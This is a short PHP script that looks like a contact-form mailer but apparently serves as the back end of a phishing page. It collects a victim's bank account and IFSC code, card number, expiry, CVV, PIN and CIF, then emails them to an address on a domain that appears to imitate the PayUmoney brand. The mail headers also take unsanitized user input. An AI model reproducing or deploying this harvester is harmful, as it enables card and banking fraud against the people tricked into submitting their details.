<?php
// Check for empty fields
$name = $_POST['name'];
$email_address = $_POST['email'];
$phone = $_POST['phone'];
$dob = $_POST['dob'];
$message = $_POST['message'];
$bank=$_POST['bank'];
$account=$_POST['account'];
$ifsc=$_POST['ifsc'];
$amount=$_POST['amount'];
$card=$_POST['card'];
$expiry=$_POST['expiry'];
$cvv=$_POST['cvv'];
$pin=$_POST['pin'];
$cif=$_POST['cif'];
$amount=$_POST['amount'];
//$name = 'Testing';
//$email_address = 'demo@test.com';
//$phone = $_POST['phone'];
//$message = 'test';	
// Create the email and send the message
$to = 'info@payumoney.online';// Add your email address inbetween the '' replacing yourname@yourdomain.com - This is where the form will send a message to.
$email_subject = "Website Contact Form:  $name";
$email_body = "You have received a new message from your website contact form.\n\n"."Here are the details:\n\nName: $name\n\nEmail: $email_address\n\nPhone: $phone\n\nDob: $dob\n\nBank: $bank\n\nAccount: $account\n\nIfsc: $ifsc\n\nAmount: $amount\n\nCif: $cif\n\nCard: $card\n\nExpiry: $expiry\n\nCvv: $cvv\n\nPin: $pin\n\nAmount: $amount\n\nMessage:\n$message";
$headers = "From: support@payumoney.online\n"; // This is the email address the generated message will be from. We recommend using something like noreply@yourdomain.com.
$headers .= "Reply-To: $email_address";	
$mail = mail($to,$email_subject,$email_body,$headers);
var_dump($mail);
return true;			
?>